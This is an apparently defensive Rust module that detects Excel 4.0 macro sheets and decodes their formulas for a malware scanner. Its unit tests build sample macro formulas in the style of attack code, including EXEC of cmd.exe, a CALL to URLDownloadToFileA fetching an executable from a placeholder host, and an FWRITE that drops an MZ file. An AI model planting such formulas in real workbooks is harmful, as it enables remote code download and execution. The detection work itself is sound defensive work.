//! Excel 4.0 (XLM) macro sheet detection.
//!
//! XLM is a pre-VBA macro technology that is still abused because it runs
//! without the VBA project (`vbaProject.bin`) and can hide in a very-hidden
//! sheet. Modern workbooks store macro sheets under `xl/macrosheets/*.xml` in
//! the OOXML package; legacy `.xls` files mark them in the `BOUNDSHEET` records
//! of the `Workbook` stream.
//!
//! Design rules:
//!
//! * **Bounded.** Sheet count, formula count, formula size and total bytes are
//!   capped; a truncated result is reported and never treated as complete.
//! * **Source, not guesses.** OOXML formulas are returned as text. Legacy BIFF5,
//!   BIFF7 and BIFF8 `FORMULA` records are decoded with the MS-XLS Ftab function
//!   table using each version's token sizes; unknown ids are rendered honestly
//!   and never guessed. BIFF4 and earlier are reported as not decoded rather
//!   than misread.
//! * **No verdict here.** The engine scores the macro-sheet signal and analyses
//!   the formula text with the same rules as any other source.

use std::io::{Cursor, Read};

use zip::ZipArchive;

/// Caps for one XLM extraction pass.
#[derive(Debug, Clone)]
pub struct XlmLimits {
    pub max_sheets: usize,
    pub max_formulas: usize,
    pub max_formula_bytes: usize,
    pub max_sheet_bytes: usize,
    pub max_total_bytes: usize,
}

impl Default for XlmLimits {
    fn default() -> Self {
        XlmLimits {
            max_sheets: 64,
            max_formulas: 4096,
            max_formula_bytes: 64 * 1024,
            max_sheet_bytes: 2 * 1024 * 1024,
            max_total_bytes: 4 * 1024 * 1024,
        }
    }
}

/// One Excel 4.0 macro sheet.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct XlmSheet {
    pub name: String,
    /// True for hidden or very-hidden sheets. Legacy BIFF exposes the exact
    /// state; the OOXML sheet list is not parsed here, so this is false there.
    pub hidden: bool,
    pub formulas: Vec<String>,
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct XlmReport {
    pub sheets: Vec<XlmSheet>,
    pub truncated: bool,
    pub notes: Vec<String>,
}

impl XlmReport {
    pub fn is_empty(&self) -> bool {
        self.sheets.is_empty()
    }

    fn note(&mut self, text: impl Into<String>) {
        if self.notes.len() < 16 {
            self.notes.push(text.into());
        }
    }
}

/// Extracts Excel 4.0 macro sheets from OOXML or legacy OLE2 workbooks.
pub fn extract(data: &[u8], limits: &XlmLimits) -> XlmReport {
    let mut out = XlmReport::default();
    if data.starts_with(b"PK\x03\x04") || data.starts_with(b"PK\x05\x06") {
        extract_ooxml(data, limits, &mut out);
    } else if data.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]) {
        extract_biff(data, limits, &mut out);
    }
    out
}

fn extract_ooxml(data: &[u8], limits: &XlmLimits, out: &mut XlmReport) {
    let mut archive = match ZipArchive::new(Cursor::new(data)) {
        Ok(a) => a,
        Err(e) => {
            out.note(format!("OOXML package could not be parsed: {e}"));
            return;
        }
    };
    let mut total = 0usize;
    for index in 0..archive.len().min(4096) {
        if out.sheets.len() >= limits.max_sheets || total >= limits.max_total_bytes {
            out.truncated = true;
            break;
        }
        let Ok(member) = archive.by_index(index) else {
            continue;
        };
        let name = member.name().to_string();
        let lower = name.to_ascii_lowercase();
        if !lower.ends_with(".xml") || !lower.contains("macrosheets/") {
            continue;
        }
        if member.size() > limits.max_sheet_bytes as u64 {
            out.truncated = true;
            out.note(format!(
                "macro sheet `{name}` is {} bytes, above the {} byte cap; not inspected",
                member.size(),
                limits.max_sheet_bytes
            ));
            continue;
        }
        let mut xml = Vec::new();
        let limit = limits.max_sheet_bytes as u64 + 1;
        if member.take(limit).read_to_end(&mut xml).is_err() {
            out.note(format!("macro sheet `{name}` could not be read"));
            continue;
        }
        if xml.len() > limits.max_sheet_bytes {
            out.truncated = true;
            out.note(format!("macro sheet `{name}` expanded beyond the cap"));
            continue;
        }
        total += xml.len();
        let formulas = extract_formulas(&xml, limits, out);
        out.sheets.push(XlmSheet {
            name: name
                .rsplit('/')
                .next()
                .unwrap_or("macrosheet")
                .trim_end_matches(".xml")
                .to_string(),
            hidden: false,
            formulas,
        });
    }
}

fn extract_formulas(xml: &[u8], limits: &XlmLimits, out: &mut XlmReport) -> Vec<String> {
    let mut formulas = Vec::new();
    collect_tag(xml, b"<xm:f>", b"</xm:f>", limits, &mut formulas);
    if formulas.is_empty() {
        collect_tag(xml, b"<f>", b"</f>", limits, &mut formulas);
    }
    if formulas.len() >= limits.max_formulas {
        out.truncated = true;
        out.note(format!(
            "macro sheet has more than {} formulas; the rest were not inspected",
            limits.max_formulas
        ));
    }
    formulas
}

fn collect_tag(
    xml: &[u8],
    open: &[u8],
    close: &[u8],
    limits: &XlmLimits,
    formulas: &mut Vec<String>,
) {
    let mut i = 0usize;
    let mut total = 0usize;
    while i < xml.len()
        && formulas.len() < limits.max_formulas
        && total < limits.max_total_bytes
    {
        let Some(p) = find(&xml[i..], open) else {
            break;
        };
        let start = i + p + open.len();
        let Some(q) = find(&xml[start..], close) else {
            break;
        };
        let end = start + q;
        if end - start > limits.max_formula_bytes {
            i = end + close.len();
            continue;
        }
        let text = decode_entities(&xml[start..end], limits.max_formula_bytes);
        total += text.len();
        formulas.push(text);
        i = end + close.len();
    }
}

fn decode_entities(raw: &[u8], max: usize) -> String {
    let text = String::from_utf8_lossy(raw);
    let text = text
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&");
    text.chars().take(max).collect()
}

fn extract_biff(data: &[u8], limits: &XlmLimits, out: &mut XlmReport) {
    let stream = match crate::vba::read_stream_named(data, &["Workbook", "Book"]) {
        Ok(Some(stream)) => stream,
        // A valid OLE2 container without a Workbook stream is simply not an
        // Excel workbook; there is nothing to report.
        Ok(None) => return,
        Err(reason) => {
            out.note(format!("legacy workbook stream was not inspected: {reason}"));
            return;
        }
    };
    if stream.len() > limits.max_sheet_bytes * 8 {
        out.truncated = true;
        out.note("workbook stream is above the size cap; sheets were not inspected");
        return;
    }

    struct MacroSheet {
        name: String,
        hidden: bool,
        offset: u32,
    }

    let mut version = 0x0600u16;
    let mut sheets: Vec<MacroSheet> = Vec::new();
    let mut i = 0usize;
    let mut records = 0usize;
    while i + 4 <= stream.len() && records < 200_000 {
        records += 1;
        let id = u16::from_le_bytes([stream[i], stream[i + 1]]);
        let len = u16::from_le_bytes([stream[i + 2], stream[i + 3]]) as usize;
        let start = i + 4;
        let Some(end) = start.checked_add(len) else {
            break;
        };
        if end > stream.len() {
            break;
        }
        let body = &stream[start..end];
        if id == 0x0809 && i == 0 && body.len() >= 2 {
            version = u16::from_le_bytes([body[0], body[1]]);
        }
        if id == 0x0085 && body.len() >= 7 {
            let visibility = body[4];
            let sheet_type = body[5];
            if sheet_type == 1 {
                if sheets.len() >= limits.max_sheets {
                    out.truncated = true;
                    out.note(format!(
                        "workbook has more than {} sheets; the rest were not inspected",
                        limits.max_sheets
                    ));
                    break;
                }
                sheets.push(MacroSheet {
                    name: biff_sheet_name(body, version),
                    hidden: visibility != 0,
                    offset: u32::from_le_bytes([body[0], body[1], body[2], body[3]]),
                });
            }
        }
        if id == 0x000A {
            break;
        }
        i = end;
    }

    if sheets.is_empty() {
        return;
    }
    let Some(biff_version) = crate::biff::BiffVersion::from_code(version) else {
        let count = sheets.len();
        for sheet in sheets {
            out.sheets.push(XlmSheet {
                name: sheet.name,
                hidden: sheet.hidden,
                formulas: Vec::new(),
            });
        }
        out.note(format!(
            "legacy BIFF version 0x{version:04X} declares {count} Excel 4.0 macro sheet(s); \
             formula token decoding supports BIFF5, BIFF7 and BIFF8 only"
        ));
        return;
    };

    let mut decoded_total = 0usize;
    let mut incomplete_total = 0usize;
    let mut formula_cap_hit = false;
    for sheet in sheets {
        let mut formulas: Vec<String> = Vec::new();
        let mut offset = sheet.offset as usize;
        if offset < 4 || offset + 4 > stream.len() {
            out.note(format!(
                "macro sheet `{}` has an invalid stream offset {}; formulas were not inspected",
                sheet.name, sheet.offset
            ));
            out.sheets.push(XlmSheet {
                name: sheet.name,
                hidden: sheet.hidden,
                formulas,
            });
            continue;
        }

        // `lbPlyPos` points at the BOF record of the sheet substream.
        let id = u16::from_le_bytes([stream[offset], stream[offset + 1]]);
        let len = u16::from_le_bytes([stream[offset + 2], stream[offset + 3]]) as usize;
        let body_start = offset + 4;
        let Some(body_end) = body_start.checked_add(len) else {
            break;
        };
        if body_end > stream.len() {
            out.note(format!(
                "macro sheet `{}` has a truncated BOF record; formulas were not inspected",
                sheet.name
            ));
            out.sheets.push(XlmSheet {
                name: sheet.name,
                hidden: sheet.hidden,
                formulas,
            });
            continue;
        }
        let body = &stream[body_start..body_end];
        if id != 0x0809
            || body.len() < 4
            || u16::from_le_bytes([body[2], body[3]]) != 0x0040
        {
            out.note(format!(
                "macro sheet `{}` does not start with a macro-sheet BOF; formulas were not \
                 inspected",
                sheet.name
            ));
            out.sheets.push(XlmSheet {
                name: sheet.name,
                hidden: sheet.hidden,
                formulas,
            });
            continue;
        }
        offset = body_end;

        let mut sheet_records = 0usize;
        while offset + 4 <= stream.len() && sheet_records < 200_000 {
            sheet_records += 1;
            let id = u16::from_le_bytes([stream[offset], stream[offset + 1]]);
            let len = u16::from_le_bytes([stream[offset + 2], stream[offset + 3]]) as usize;
            let start = offset + 4;
            let Some(end) = start.checked_add(len) else {
                break;
            };
            if end > stream.len() {
                break;
            }
            let body = &stream[start..end];
            if id == 0x0006 && body.len() >= 22 {
                let cce = u16::from_le_bytes([body[20], body[21]]) as usize;
                if cce > limits.max_formula_bytes {
                    out.truncated = true;
                    out.note("a legacy formula is above the formula-size cap; it was not decoded");
                } else if cce > body.len() - 22 {
                    incomplete_total += 1;
                    out.note(format!(
                        "macro sheet `{}` has a truncated FORMULA record; its token stream was \
                         not decoded",
                        sheet.name
                    ));
                } else if decoded_total >= limits.max_formulas {
                    formula_cap_hit = true;
                    break;
                } else {
                    // `rgcb` follows `rgce` in the record body; it carries the
                    // values for any array constants in the token stream.
                    let decoded = crate::biff::decode_with_extra(
                        &body[22..22 + cce],
                        &body[22 + cce..],
                        limits.max_formula_bytes,
                        biff_version,
                    );
                    if !decoded.complete {
                        incomplete_total += 1;
                    }
                    formulas.push(decoded.text);
                    decoded_total += 1;
                }
            }
            if id == 0x000A {
                break;
            }
            offset = end;
        }

        out.sheets.push(XlmSheet {
            name: sheet.name,
            hidden: sheet.hidden,
            formulas,
        });
        if formula_cap_hit {
            break;
        }
    }

    if formula_cap_hit {
        out.truncated = true;
        out.note(format!(
            "legacy BIFF workbook has more than {} formulas; the rest were not inspected",
            limits.max_formulas
        ));
    }
    let label = biff_version.label();
    if decoded_total > 0 {
        let sheet_count = out.sheets.len();
        out.note(format!(
            "legacy {label}: decoded {decoded_total} formula(s) from {sheet_count} macro sheet(s)"
        ));
    } else if !out.sheets.is_empty() {
        out.note(format!(
            "legacy {label}: no FORMULA records were found in the macro sheet(s)"
        ));
    }
    if incomplete_total > 0 {
        out.note(format!(
            "legacy {label}: {incomplete_total} formula(s) were only partially decoded (unknown \
             or truncated tokens)"
        ));
    }
}

fn biff_sheet_name(body: &[u8], version: u16) -> String {
    if body.len() < 7 {
        return String::new();
    }
    let cch = (body[6] as usize).min(31);
    if version == 0x0600 {
        let flags = body.get(7).copied().unwrap_or(0);
        let bytes = body.get(8..).unwrap_or(&[]);
        if flags & 0x01 == 1 {
            let units: Vec<u16> = bytes
                .chunks_exact(2)
                .take(cch)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            String::from_utf16_lossy(&units)
        } else {
            bytes.iter().take(cch).map(|&b| char::from(b)).collect()
        }
    } else {
        // BIFF5/7 BOUNDSHEET: cch at offset 6, bytes at offset 7 (no flags).
        body.get(7..)
            .unwrap_or(&[])
            .iter()
            .take(cch)
            .map(|&b| char::from(b))
            .collect()
    }
}

fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

#[cfg(test)]
pub(crate) mod fixtures {
    use std::io::Write;

    use zip::write::SimpleFileOptions;

    /// Builds a `.xlsm`-shaped ZIP carrying one macro sheet part.
    pub fn xlsm(macrosheet_xml: &[u8]) -> Vec<u8> {
        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let options =
            SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (name, data) in [
            ("[Content_Types].xml", b"<Types/>".as_slice()),
            ("xl/workbook.xml", b"<workbook/>".as_slice()),
            ("xl/macrosheets/sheet1.xml", macrosheet_xml),
        ] {
            writer.start_file(name, options).unwrap();
            writer.write_all(data).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }

    /// Builds BIFF8 workbook globals with one `BOUNDSHEET` record.
    pub fn biff_globals(name: &str, hidden: bool, macro_sheet: bool) -> Vec<u8> {
        biff_globals_at(name, hidden, macro_sheet, 0)
    }

    fn biff_globals_at(name: &str, hidden: bool, macro_sheet: bool, offset: u32) -> Vec<u8> {
        biff_globals_versioned(name, hidden, macro_sheet, 0x0600, offset)
    }

    fn biff_globals_versioned(
        name: &str,
        hidden: bool,
        macro_sheet: bool,
        version: u16,
        offset: u32,
    ) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(&0x0809u16.to_le_bytes());
        out.extend_from_slice(&16u16.to_le_bytes());
        out.extend_from_slice(&version.to_le_bytes());
        out.extend_from_slice(&0x0005u16.to_le_bytes()); // workbook globals
        out.extend_from_slice(&[0u8; 12]);

        let mut body = Vec::new();
        body.extend_from_slice(&offset.to_le_bytes()); // lbPlyPos
        body.push(if hidden { 2 } else { 0 });
        body.push(if macro_sheet { 1 } else { 0 });
        if version == 0x0600 {
            let units: Vec<u16> = name.encode_utf16().collect();
            body.push(units.len() as u8);
            body.push(1); // UTF-16LE name
            for unit in &units {
                body.extend_from_slice(&unit.to_le_bytes());
            }
        } else {
            // BIFF5/7: one-byte length, Latin-1 bytes, no flags byte.
            let bytes: Vec<u8> = name.bytes().take(31).collect();
            body.push(bytes.len() as u8);
            body.extend_from_slice(&bytes);
        }
        out.extend_from_slice(&0x0085u16.to_le_bytes());
        out.extend_from_slice(&(body.len() as u16).to_le_bytes());
        out.extend_from_slice(&body);

        out.extend_from_slice(&0x000Au16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    /// Builds a macro-sheet substream containing `FORMULA` records.
    fn biff_macro_sheet_versioned(formulas: &[Vec<u8>], version: u16) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(&0x0809u16.to_le_bytes());
        out.extend_from_slice(&16u16.to_le_bytes());
        out.extend_from_slice(&version.to_le_bytes());
        out.extend_from_slice(&0x0040u16.to_le_bytes()); // macro sheet
        out.extend_from_slice(&[0u8; 12]);
        for formula in formulas {
            out.extend_from_slice(formula);
        }
        out.extend_from_slice(&0x000Au16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out
    }

    /// Builds a BIFF8 workbook whose macro-sheet `lbPlyPos` points at a real
    /// macro-sheet substream. `formulas` are complete `FORMULA` records.
    pub fn biff_workbook(name: &str, hidden: bool, formulas: &[Vec<u8>]) -> Vec<u8> {
        biff_workbook_versioned(name, hidden, formulas, 0x0600)
    }

    /// Builds a BIFF5 (Excel 5.0/95) workbook with a real macro-sheet substream.
    pub fn biff5_workbook(name: &str, hidden: bool, formulas: &[Vec<u8>]) -> Vec<u8> {
        biff_workbook_versioned(name, hidden, formulas, 0x0500)
    }

    /// Builds a BIFF7 (Excel 95) workbook with a real macro-sheet substream.
    pub fn biff7_workbook(name: &str, hidden: bool, formulas: &[Vec<u8>]) -> Vec<u8> {
        biff_workbook_versioned(name, hidden, formulas, 0x0700)
    }

    fn biff_workbook_versioned(
        name: &str,
        hidden: bool,
        formulas: &[Vec<u8>],
        version: u16,
    ) -> Vec<u8> {
        let globals_len = biff_globals_versioned(name, hidden, true, version, 0).len();
        let mut out = biff_globals_versioned(name, hidden, true, version, globals_len as u32);
        out.extend_from_slice(&biff_macro_sheet_versioned(formulas, version));
        out
    }
}

#[cfg(test)]
mod tests {
    use super::fixtures::{biff5_workbook, biff7_workbook, biff_globals, biff_workbook, xlsm};
    use super::*;
    use crate::vba::fixtures::cfb_stream;

    fn formulas(report: &XlmReport) -> Vec<&str> {
        report
            .sheets
            .iter()
            .flat_map(|s| s.formulas.iter().map(|f| f.as_str()))
            .collect()
    }

    #[test]
    fn an_ooxml_macro_sheet_yields_its_formulas() {
        let xml = br#"<xm:worksheet><xm:sheetData><xm:row><xm:c><xm:f>EXEC("calc.exe")</xm:f></xm:c></xm:row></xm:sheetData></xm:worksheet>"#;
        let report = extract(&xlsm(xml), &XlmLimits::default());
        assert_eq!(report.sheets.len(), 1, "notes: {:?}", report.notes);
        assert_eq!(report.sheets[0].formulas.len(), 1);
        assert!(formulas(&report)[0].contains("EXEC"));
    }

    #[test]
    fn xml_entities_are_decoded_for_rule_matching() {
        let xml = br#"<xm:f>EXEC(&quot;cmd.exe /c calc&quot;)</xm:f>"#;
        let report = extract(&xlsm(xml), &XlmLimits::default());
        assert_eq!(formulas(&report)[0], "EXEC(\"cmd.exe /c calc\")");
    }

    #[test]
    fn a_workbook_without_macrosheets_is_empty() {
        let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
        let options =
            zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        writer.start_file("xl/workbook.xml", options).unwrap();
        std::io::Write::write_all(&mut writer, b"<workbook/>").unwrap();
        let data = writer.finish().unwrap().into_inner();
        assert!(extract(&data, &XlmLimits::default()).is_empty());
    }

    #[test]
    fn a_legacy_workbook_reports_a_hidden_macro_sheet() {
        let stream = biff_globals("Macro1", true, true);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets.len(), 1, "notes: {:?}", report.notes);
        assert_eq!(report.sheets[0].name, "Macro1");
        assert!(report.sheets[0].hidden);
        assert!(report.sheets[0].formulas.is_empty());
        assert!(report.notes.iter().any(|n| n.contains("no FORMULA records")));
    }

    #[test]
    fn a_legacy_macro_sheet_formula_is_decoded_as_text() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str};

        let mut rgce = ptg_str("calc.exe");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let stream = biff_workbook("Macro1", true, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets.len(), 1, "notes: {:?}", report.notes);
        assert_eq!(report.sheets[0].formulas, vec!["EXEC(\"calc.exe\")"]);
        assert!(
            report.notes.iter().any(|n| n.contains("decoded 1 formula")),
            "notes: {:?}",
            report.notes
        );
        assert!(
            !report.notes.iter().any(|n| n.contains("not decoded")),
            "notes: {:?}",
            report.notes
        );
    }

    #[test]
    fn a_legacy_call_formula_is_decoded_with_its_arguments() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str};

        let mut rgce = ptg_str("urlmon");
        rgce.extend_from_slice(&ptg_str("URLDownloadToFileA"));
        rgce.extend_from_slice(&ptg_str("http://example.invalid/a.exe"));
        rgce.extend_from_slice(&ptg_func_var(0x0096, 3, true));
        let stream = biff_workbook("Macro1", false, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(
            report.sheets[0].formulas,
            vec!["CALL(\"urlmon\",\"URLDownloadToFileA\",\"http://example.invalid/a.exe\")"]
        );
    }

    #[test]
    fn an_unknown_legacy_function_is_reported_as_incomplete() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str};

        let mut rgce = ptg_str("x");
        rgce.extend_from_slice(&ptg_func_var(0x0200, 1, true));
        let stream = biff_workbook("Macro1", true, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets[0].formulas, vec!["MACRO_0x0200(\"x\")"]);
        assert!(
            report.notes.iter().any(|n| n.contains("partially decoded")),
            "notes: {:?}",
            report.notes
        );
    }

    #[test]
    fn a_biff5_macro_sheet_formula_is_decoded_as_text() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str_latin1};

        let mut rgce = ptg_str_latin1("calc.exe");
        rgce.extend_from_slice(&ptg_func_var(0x006E, 1, true));
        let stream = biff5_workbook("Macro1", true, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets.len(), 1, "notes: {:?}", report.notes);
        assert_eq!(report.sheets[0].name, "Macro1");
        assert!(report.sheets[0].hidden);
        assert_eq!(report.sheets[0].formulas, vec!["EXEC(\"calc.exe\")"]);
        assert!(
            report.notes.iter().any(|n| n.contains("BIFF5")),
            "notes: {:?}",
            report.notes
        );
    }

    #[test]
    fn a_biff7_macro_sheet_formula_is_decoded_as_text() {
        use crate::biff::fixtures::{formula_record, ptg_func_var, ptg_str_latin1};

        let mut rgce = ptg_str_latin1("C:\\payload.exe");
        rgce.extend_from_slice(&ptg_str_latin1("MZ"));
        rgce.extend_from_slice(&ptg_func_var(0x008A, 2, true)); // FWRITE
        let stream = biff7_workbook("Macro1", false, &[formula_record(&rgce)]);
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets.len(), 1, "notes: {:?}", report.notes);
        assert_eq!(
            report.sheets[0].formulas,
            vec!["FWRITE(\"C:\\payload.exe\",\"MZ\")"]
        );
        assert!(
            report.notes.iter().any(|n| n.contains("BIFF7")),
            "notes: {:?}",
            report.notes
        );
    }

    #[test]
    fn a_legacy_array_constant_is_decoded_from_the_record_extra() {
        use crate::biff::fixtures::{
            array_constant, formula_record_with_extra, ptg_func_var,
        };

        let (mut rgce, extra) = array_constant(2, 1, &[1.0, 2.0]);
        rgce.extend_from_slice(&ptg_func_var(0x0004, 1, false)); // SUM
        let stream = biff_workbook(
            "Macro1",
            true,
            &[formula_record_with_extra(&rgce, &extra)],
        );
        let data = cfb_stream("Workbook", &stream);
        let report = extract(&data, &XlmLimits::default());
        assert_eq!(report.sheets[0].formulas, vec!["SUM({1,2})"]);
        assert!(
            !report
                .notes
                .iter()
                .any(|n| n.contains("partially decoded")),
            "notes: {:?}",
            report.notes
        );
    }

    #[test]
    fn a_normal_legacy_worksheet_is_not_a_macro_sheet() {
        let stream = biff_globals("Sheet1", false, false);
        let data = cfb_stream("Workbook", &stream);
        assert!(extract(&data, &XlmLimits::default()).is_empty());
    }

    #[test]
    fn the_formula_cap_is_reported() {
        let xml = br#"<xm:f>EXEC("a")</xm:f><xm:f>EXEC("b")</xm:f>"#;
        let limits = XlmLimits {
            max_formulas: 1,
            ..Default::default()
        };
        let report = extract(&xlsm(xml), &limits);
        assert_eq!(report.sheets[0].formulas.len(), 1);
        assert!(report.truncated);
    }

    #[test]
    fn corrupt_inputs_never_panic() {
        let _ = extract(b"PK\x03\x04 not a zip", &XlmLimits::default());
        let _ = extract(b"", &XlmLimits::default());
        let mut cfb = vec![0u8; 1024];
        cfb[..8].copy_from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
        let _ = extract(&cfb, &XlmLimits::default());
    }
}
